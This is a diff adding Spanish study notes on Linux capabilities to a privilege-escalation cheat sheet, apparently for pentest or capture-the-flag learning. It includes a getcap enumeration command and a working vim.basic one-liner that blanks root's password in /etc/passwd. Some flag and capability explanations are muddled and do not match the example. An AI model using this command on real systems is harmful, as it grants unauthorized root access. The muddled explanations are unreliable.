@@ -53,3 +53,25 @@ PATH ABUSE!!
 | `cap_sys_resource`     | Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar. |
 | `cap_sys_module`       | Permite cargar y descargar módulos del kernel, potencialmente permitiendo modificar el comportamiento del sistema operativo o acceder a información sensible. |
 | `cap_net_bind_service` | Permite enlazar a puertos de red, potencialmente permitiendo acceder a información sensible o realizar acciones no autorizadas. |
+
+
+| Valor de Capacidad | Descripción                                                                                                      |
+|--------------------|------------------------------------------------------------------------------------------------------------------|
+| `=`                | Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad previamente establecida para el ejecutable. |
+| `+ep`              | Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. |
+| `+ei`              | Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite y que los procesos hijos generados por el ejecutable hereden la capacidad y realicen las mismas acciones. |
+| `+p`               | Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no estén permitidas por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable pero evitar que herede la capacidad o que los procesos hijos la hereden. |
+
+| Capacidad          | Descripción                                                                                                      |
+|--------------------|------------------------------------------------------------------------------------------------------------------|
+| `cap_setuid`       | Permite a un proceso establecer su ID de usuario efectivo, lo que puede usarse para obtener los privilegios de otro usuario, incluido el usuario root. |
+| `cap_setgid`       | Permite establecer su ID de grupo efectivo, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo root. |
+| `cap_sys_admin`    | Esta capacidad proporciona una amplia gama de privilegios administrativos, incluyendo la capacidad de realizar muchas acciones reservadas para el usuario root, como modificar configuraciones del sistema y montar y desmontar sistemas de archivos. |
+| `cap_dac_override` | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos. |
+
+### Enumerar capabilities
+- `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`: este comando hace un chequeo de los binarios que tienen capabilities.
+### Explotando capabilities
+- Ejemplo: `/usr/bin/vim.basic /etc/passwd`
+    - `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
+    - En este caso el binario vim.basic tiene la capacidad `cap_setuid` y `cap_setgid` por lo que podemos ejecutar el comando `id` como root..
